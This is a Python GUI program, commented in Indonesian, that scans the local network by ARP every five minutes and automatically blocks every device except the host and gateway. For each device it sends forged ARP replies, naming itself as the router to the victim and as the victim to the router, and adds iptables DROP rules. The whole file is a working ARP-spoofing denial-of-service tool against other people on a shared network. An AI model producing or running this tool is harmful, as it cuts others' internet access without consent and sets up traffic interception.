#!/usr/bin/env python3
# linux ubuntu
# sudo /home/whoami/anaconda3/envs/venv2/bin/python auto_blocker.py
import sys
import subprocess
import threading
import time
from typing import List
from dataclasses import dataclass

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, 
    QWidget, QTableWidget, QTableWidgetItem,
    QLabel, QTextEdit, QGroupBox, QHeaderView, QProgressBar
)
from PyQt6.QtCore import QThread, pyqtSignal, QTimer, Qt
from PyQt6.QtGui import QColor

try:
    from scapy.all import *
except ImportError:
    print("Error: Scapy tidak terinstall. Install dengan: pip install scapy")
    sys.exit(1)

@dataclass
class Device:
    ip: str
    mac: str
    is_protected: bool = False

class NetworkInterface:
    def __init__(self, name: str):
        self.name = name

def get_default_iface():
    """Mendapatkan interface default."""
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if line.startswith('default'):
                parts = line.split()
                iface_name = parts[4] if len(parts) > 4 else 'eth0'
                return NetworkInterface(iface_name)
    except Exception:
        return NetworkInterface('eth0')
    return NetworkInterface('NULL')

def get_my_ip():
    """Mendapatkan IP address komputer ini."""
    try:
        iface = get_default_iface()
        result = subprocess.run(['ip', 'addr', 'show', iface.name], 
                              capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'inet ' in line and 'inet6' not in line:
                ip = line.strip().split()[1].split('/')[0]
                return ip
    except Exception as e:
        print(f"Error getting my IP: {e}")
    return None

def get_my_mac():
    """Mendapatkan MAC address komputer ini."""
    try:
        iface = get_default_iface()
        result = subprocess.run(['ip', 'link', 'show', iface.name], 
                              capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'link/ether' in line:
                mac = line.strip().split()[1]
                return mac
    except Exception as e:
        print(f"Error getting my MAC: {e}")
    return None

def get_gateway():
    """Mendapatkan IP gateway/router."""
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if line.startswith('default'):
                parts = line.split()
                return parts[2]
    except Exception:
        pass
    return None

def threaded(func):
    """Decorator untuk menjalankan fungsi di thread terpisah."""
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread
    return wrapper

class AutoBlocker:
    def __init__(self):
        self.iface = get_default_iface()
        self.my_ip = get_my_ip()
        self.my_mac = get_my_mac()
        self.gateway_ip = get_gateway()
        self.gateway_mac = None
        self.blocked_devices = {}
        self.running = True
        
        print(f"[INFO] My IP: {self.my_ip}, My MAC: {self.my_mac}")
        print(f"[INFO] Gateway IP: {self.gateway_ip}")
        
        # Get gateway MAC
        self.get_gateway_mac()

    def get_gateway_mac(self):
        """Mendapatkan MAC address gateway."""
        if not self.gateway_ip:
            return
        try:
            arp = ARP(pdst=self.gateway_ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=3, verbose=0)[0]
            if result:
                self.gateway_mac = result[0][1].hwsrc
                print(f"[INFO] Gateway MAC: {self.gateway_mac}")
        except Exception as e:
            print(f"[ERROR] Failed to get gateway MAC: {e}")

    def clear_iptables(self):
        """Bersihkan semua rule iptables yang ada."""
        try:
            subprocess.run(['iptables', '-F', 'FORWARD'], check=True, stderr=subprocess.DEVNULL)
            print("[IPTABLES] Cleared all FORWARD rules")
        except:
            pass

    def add_iptables_drop(self, ip):
        """Tambahkan rule iptables untuk DROP traffic dari/ke IP."""
        try:
            # Drop packets dari victim
            subprocess.run(['iptables', '-A', 'FORWARD', '-s', ip, '-j', 'DROP'], 
                         check=True, stderr=subprocess.DEVNULL)
            # Drop packets ke victim
            subprocess.run(['iptables', '-A', 'FORWARD', '-d', ip, '-j', 'DROP'], 
                         check=True, stderr=subprocess.DEVNULL)
            print(f"[IPTABLES] Added DROP rules for {ip}")
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Failed to add iptables rule for {ip}: {e}")

    @threaded
    def poison_device(self, device):
        """ARP poisoning untuk satu device."""
        if device.mac in self.blocked_devices:
            return
        
        self.blocked_devices[device.mac] = device
        self.add_iptables_drop(device.ip)
        
        # ARP spoofing: buat victim pikir kita adalah router
        poison_victim = ARP(
            op=2,
            psrc=self.gateway_ip,
            hwsrc=self.my_mac,
            pdst=device.ip,
            hwdst=device.mac
        )
        
        # ARP spoofing: buat router pikir kita adalah victim
        poison_router = ARP(
            op=2,
            psrc=device.ip,
            hwsrc=self.my_mac,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac
        )
        
        print(f'[BLOCK] Started blocking {device.ip} ({device.mac})')
        
        while device.mac in self.blocked_devices and self.running:
            try:
                send(poison_victim, iface=self.iface.name, verbose=0)
                send(poison_router, iface=self.iface.name, verbose=0)
                time.sleep(2)
            except Exception as e:
                print(f"[ERROR] Error poisoning {device.ip}: {e}")
                break

    def block_all(self, devices):
        """Block semua device yang tidak dilindungi."""
        for device in devices:
            if device.is_protected:
                continue
            if device.mac not in self.blocked_devices:
                self.poison_device(device)

    def stop(self):
        """Stop blocker dan cleanup."""
        print("[CLEANUP] Stopping blocker...")
        self.running = False
        self.blocked_devices.clear()
        time.sleep(2)
        self.clear_iptables()
        print("[CLEANUP] Cleanup complete")

class NetworkScanner(QThread):
    devices_found = pyqtSignal(list)
    progress_update = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.my_ip = get_my_ip()
        self.my_mac = get_my_mac()
        self.gateway_ip = get_gateway()
        self.gateway_mac = None
    
    def get_network_range(self):
        """Mendapatkan network range."""
        try:
            iface = get_default_iface()
            result = subprocess.run(['ip', 'addr', 'show', iface.name], 
                                  capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if 'inet ' in line and 'inet6' not in line:
                    return line.strip().split()[1]
        except Exception as e:
            print(f"Error getting network range: {e}")
        return None
    
    def get_gateway_mac(self):
        """Mendapatkan MAC address gateway."""
        if not self.gateway_ip:
            return None
        try:
            arp = ARP(pdst=self.gateway_ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=3, verbose=0)[0]
            if result:
                return result[0][1].hwsrc
        except Exception:
            pass
        return None
    
    def run(self):
        """Scan jaringan."""
        network = self.get_network_range()
        if not network:
            self.progress_update.emit("Failed to get network range")
            return
        
        self.progress_update.emit(f"Scanning network: {network}")
        
        try:
            arp = ARP(pdst=network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=10, verbose=0)[0]
            
            devices = []
            self.gateway_mac = self.get_gateway_mac()
            
            for sent, received in result:
                # Tentukan apakah device dilindungi
                is_self = (received.psrc == self.my_ip or received.hwsrc == self.my_mac)
                is_gateway = (received.psrc == self.gateway_ip or 
                            (self.gateway_mac and received.hwsrc == self.gateway_mac))
                
                device = Device(
                    ip=received.psrc,
                    mac=received.hwsrc,
                    is_protected=(is_self or is_gateway)
                )
                devices.append(device)
            
            self.devices_found.emit(devices)
            self.progress_update.emit(f"Found {len(devices)} devices - Auto-blocking non-protected devices...")
            
        except Exception as e:
            self.progress_update.emit(f"Scan error: {e}")

class AutoBlockerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.devices = []
        self.blocker = AutoBlocker()
        self.scanner = NetworkScanner()
        
        self.init_ui()
        self.setup_connections()
        
        # Auto-scan timer (5 menit = 300000 ms)
        self.scan_timer = QTimer()
        self.scan_timer.timeout.connect(self.auto_scan)
        self.scan_timer.start(300000)  # 5 menit
        
        # Mulai scan pertama
        QTimer.singleShot(1000, self.auto_scan)
        
    def init_ui(self):
        self.setWindowTitle("Auto Network Blocker - Active")
        self.setGeometry(100, 100, 900, 600)
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        
        # Status panel
        status_group = QGroupBox("Status")
        status_layout = QVBoxLayout(status_group)
        
        self.status_label = QLabel("Initializing...")
        self.status_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #27ae60;")
        status_layout.addWidget(self.status_label)
        
        self.next_scan_label = QLabel("Next scan in: 5:00")
        self.next_scan_label.setStyleSheet("font-size: 12px; color: #7f8c8d;")
        status_layout.addWidget(self.next_scan_label)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        status_layout.addWidget(self.progress_bar)
        
        layout.addWidget(status_group)
        
        # Device table
        device_group = QGroupBox("Network Devices")
        device_layout = QVBoxLayout(device_group)
        
        self.device_table = QTableWidget()
        self.device_table.setColumnCount(3)
        self.device_table.setHorizontalHeaderLabels(["IP Address", "MAC Address", "Status"])
        
        header = self.device_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        
        device_layout.addWidget(self.device_table)
        layout.addWidget(device_group)
        
        # Log area
        log_group = QGroupBox("Activity Log")
        log_layout = QVBoxLayout(log_group)
        
        self.log_text = QTextEdit()
        self.log_text.setMaximumHeight(150)
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        
        layout.addWidget(log_group)
        
        # Timer untuk countdown
        self.countdown_timer = QTimer()
        self.countdown_timer.timeout.connect(self.update_countdown)
        self.remaining_seconds = 300
        
        self.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #cccccc;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
        """)
    
    def setup_connections(self):
        self.scanner.devices_found.connect(self.on_devices_found)
        self.scanner.progress_update.connect(self.update_status)
        self.scanner.finished.connect(self.scan_finished)
    
    def log_message(self, message):
        """Tambahkan pesan ke log."""
        timestamp = time.strftime('%H:%M:%S')
        self.log_text.append(f"[{timestamp}] {message}")
    
    def update_status(self, message):
        """Update status label."""
        self.status_label.setText(message)
        self.log_message(message)
    
    def update_countdown(self):
        """Update countdown timer."""
        self.remaining_seconds -= 1
        if self.remaining_seconds < 0:
            self.remaining_seconds = 300
        
        minutes = self.remaining_seconds // 60
        seconds = self.remaining_seconds % 60
        self.next_scan_label.setText(f"Next scan in: {minutes}:{seconds:02d}")
    
    def auto_scan(self):
        """Mulai auto scan."""
        if self.scanner.isRunning():
            return
        
        self.log_message("=== Starting automatic scan ===")
        self.progress_bar.setVisible(True)
        self.progress_bar.setRange(0, 0)
        self.remaining_seconds = 300
        self.countdown_timer.start(1000)
        
        self.scanner.start()
    
    def scan_finished(self):
        """Scan selesai."""
        self.progress_bar.setVisible(False)
    
    def on_devices_found(self, devices):
        """Handle devices ditemukan."""
        self.devices = devices
        self.update_device_table()
        
        # Auto-block semua device yang tidak dilindungi
        non_protected = [d for d in devices if not d.is_protected]
        if non_protected:
            self.blocker.block_all(non_protected)
            self.log_message(f"Auto-blocked {len(non_protected)} devices")
        else:
            self.log_message("No devices to block")
    
    def update_device_table(self):
        """Update tabel device."""
        self.device_table.setRowCount(len(self.devices))
        
        for i, device in enumerate(self.devices):
            # IP
            ip_item = QTableWidgetItem(device.ip)
            self.device_table.setItem(i, 0, ip_item)
            
            # MAC
            mac_item = QTableWidgetItem(device.mac)
            self.device_table.setItem(i, 1, mac_item)
            
            # Status
            if device.is_protected:
                if device.ip == self.blocker.my_ip:
                    status_item = QTableWidgetItem("THIS COMPUTER")
                    status_item.setBackground(QColor(0, 255, 0, 100))
                elif device.ip == self.blocker.gateway_ip:
                    status_item = QTableWidgetItem("GATEWAY/ROUTER")
                    status_item.setBackground(QColor(255, 255, 0, 100))
                else:
                    status_item = QTableWidgetItem("PROTECTED")
                    status_item.setBackground(QColor(0, 191, 255, 100))
            else:
                status_item = QTableWidgetItem("🚫 BLOCKED - NO INTERNET")
                status_item.setBackground(QColor(255, 0, 0, 100))
            
            self.device_table.setItem(i, 2, status_item)
    
    def closeEvent(self, event):
        """Handle aplikasi ditutup."""
        self.log_message("Stopping blocker and cleaning up...")
        self.scan_timer.stop()
        self.countdown_timer.stop()
        self.blocker.stop()
        time.sleep(2)
        event.accept()

def main():
    app = QApplication(sys.argv)
    
    # Check root
    if os.geteuid() != 0:
        print("Error: Aplikasi ini memerlukan hak akses root.")
        print("Jalankan dengan: sudo python3 auto_blocker.py")
        sys.exit(1)
    
    window = AutoBlockerGUI()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    import os
    main()
